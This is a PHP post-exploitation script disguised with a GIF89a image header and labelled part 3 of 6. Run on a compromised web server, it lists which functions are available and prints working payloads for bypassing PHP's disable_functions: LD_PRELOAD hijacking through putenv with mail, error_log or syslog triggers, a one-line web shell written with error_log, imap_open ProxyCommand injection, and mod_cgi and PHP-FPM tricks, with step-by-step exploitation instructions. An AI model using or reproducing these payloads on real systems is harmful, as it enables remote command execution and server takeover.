GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
$o = '';

$o .= "============================================================\n";
$o .= "  PART 3/6 - LD_PRELOAD Bypass + Special Bypass\n";
$o .= "============================================================\n\n";

$o .= "====== 4. LD_PRELOAD Bypass (disable_functions bypass) [CRITICAL] ======\n";
$o .= "Technique: putenv(LD_PRELOAD) + function that calls execve internally\n";
$o .= "The .so library hijacks a libc function (like geteuid) to run commands\n";
$o .= "Tools: Chankro3, dfunc-bypasser\n\n";

$o .= "--- KEY: putenv() ---\n";
$s = ok('putenv') ? "[+] AVAILABLE" : "[-] blocked";
$o .= "  $s  putenv\n";
$o .= "           THE critical function - sets LD_PRELOAD environment variable\n";
$o .= "           Without this, LD_PRELOAD bypass is NOT possible\n";
if (ok('putenv')) $o .= "           Test: putenv('LD_PRELOAD=/tmp/evil.so');\n";
$o .= "\n";

$o .= "--- TRIGGER FUNCTIONS (call execve internally) ---\n\n";

$triggers = array(
    'mail' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); mail('a','a','a');",
        'Calls sendmail binary internally - MOST COMMON trigger',
        'Default PHP (sendmail must be installed)',
        "putenv('LD_PRELOAD=/path/evil.so');\nputenv('_evilcmd='.\$_GET['c']);\nmail('a','a','a');\necho file_get_contents('/tmp/_output.txt');"
    ),
    'mb_send_mail' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); mb_send_mail('a','a','a');",
        'Alternative to mail() - often forgotten in disable_functions!',
        'php-mbstring module',
        ""
    ),
    'imap_mail' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); imap_mail('a','a','a');",
        'IMAP version of mail()',
        'php-imap module',
        ""
    ),
    'error_log' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); error_log('x',1,'a@a.com');",
        'DUAL PURPOSE: LD_PRELOAD trigger + can write to ANY file!',
        'Default PHP',
        "error_log('<?php system(\$_GET[c]);?>',3,'/var/www/html/shell.php');"
    ),
    'syslog' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); openlog('x',LOG_PID,LOG_USER); syslog(LOG_ERR,'x');",
        'System logger - less commonly disabled',
        'Default PHP',
        ""
    ),
    'libvirt_connect' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); libvirt_connect('qemu:///system');",
        'Libvirt module trigger',
        'php-libvirt-php module',
        ""
    ),
    'gnupg_init' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so'); gnupg_init();",
        'GnuPG module trigger',
        'php-gnupg module',
        ""
    ),
);

$available_triggers = array();
foreach ($triggers as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[1]}\n";
    $o .= "           Requires: {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Payload: {$info[0]}\n";
        if ($info[3]) $o .= "           Bonus: {$info[3]}\n";
        $available_triggers[] = $f;
    }
    $o .= "\n";
}

// BYPASS VERDICT
if (ok('putenv') && count($available_triggers) > 0) {
    $o .= "  ============================================\n";
    $o .= "  >>> LD_PRELOAD BYPASS IS POSSIBLE!\n";
    $o .= "  >>> putenv + " . implode(' / ', $available_triggers) . "\n";
    $o .= "  >>>\n";
    $o .= "  >>> HOW TO EXPLOIT:\n";
    $o .= "  >>> 1. Compile evil.so on your machine (same arch as target):\n";
    $o .= "  >>>    gcc -Wall -fPIC -shared -o evil.so evil.c -ldl\n";
    $o .= "  >>> 2. Upload evil.so to writable dir (/tmp or uploads)\n";
    $o .= "  >>> 3. Upload PHP trigger file\n";
    $o .= "  >>> 4. Visit trigger URL: ?cmd=whoami\n";
    $o .= "  >>>\n";
    $o .= "  >>> OR use Chankro3 (automated):\n";
    $o .= "  >>>    python chankro3.py --arch 64 --input rev.sh --output exploit.php --path /uploads/\n";
    $o .= "  >>>    Upload exploit.php and visit it\n";
    $o .= "  ============================================\n";
} elseif (!ok('putenv')) {
    $o .= "  [!] putenv is BLOCKED - LD_PRELOAD bypass not possible\n";
} else {
    $o .= "  [!] No trigger functions available\n";
}

// ============================================================
$o .= "\n====== 5. Special Bypass Functions [CRITICAL] ======\n";
$o .= "Alternative RCE paths that bypass disable_functions differently\n\n";

$special = array(
    'imap_open' => array(
        "[CVE-2018-19518] ProxyCommand injection via SSH",
        "imap_open('{x]\"-oProxyCommand=echo\\tYWlk|base64\\t-d|bash}:143/imap','','')",
        "Without /norsh flag, connects via SSH where ProxyCommand executes arbitrary commands.\nPayload is base64-encoded to avoid bad chars.\nMetasploit: exploit/linux/http/php_imap_open_rce",
        'php-imap module'
    ),
    'dl' => array(
        "Load custom PHP extension (.so) at runtime",
        "dl('evil.so');",
        "Compile a PHP extension containing your payload.\nThe extension runs with PHP's privileges.\nUsually disabled but worth checking.",
        'PHP core (usually disabled)'
    ),
    'virtual' => array(
        "Apache sub-request execution",
        "virtual('/cgi-bin/exploit.cgi');",
        "Apache-specific function for internal sub-requests.\nCan trigger CGI scripts or other handlers.\nLimited but useful in specific scenarios.",
        'Apache mod_php only'
    ),
);

foreach ($special as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[0]}\n";
    $o .= "           Requires: {$info[3]}\n";
    if (ok($f)) {
        $o .= "           Payload: {$info[1]}\n";
        $o .= "           Detail: {$info[2]}\n";
    }
    $o .= "\n";
}

// Apache mod_cgi bypass
$o .= "--- OTHER BYPASS TECHNIQUES (not function-dependent) ---\n\n";
$o .= "  [*] mod_cgi bypass:\n";
$o .= "      If mod_cgi enabled, upload .htaccess + CGI script\n";
$o .= "      .htaccess: Options +ExecCGI\\nAddHandler cgi-script .cgi\n";
$o .= "      script.cgi: #!/bin/bash\\necho 'Content-Type: text/plain'\\necho\\nid\n\n";
$o .= "  [*] PHP-FPM / FastCGI bypass:\n";
$o .= "      If PHP-FPM running, poison requests via unix socket\n";
$o .= "      Needs: fsockopen or stream_socket_client + fwrite\n";
$o .= "      Tool: Gopherus (generates FastCGI payload)\n\n";
$o .= "  [*] /proc/self/mem write:\n";
$o .= "      Write directly to PHP process memory to overwrite\n";
$o .= "      disable_functions handler. Linux only, needs fopen+fwrite.\n\n";
$o .= "  [*] PHP version-specific UAF exploits:\n";
$o .= "      PHP 7.0-7.4.3: debug_backtrace() UAF\n";
$o .= "      PHP 7.0-8.0: SplDoublyLinkedList UAF\n";
$o .= "      Search: github.com/mm0r1/exploits\n";

file_put_contents('/tmp/_audit_p3.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 3/6 saved to /tmp/_audit_p3.txt\n";
?>
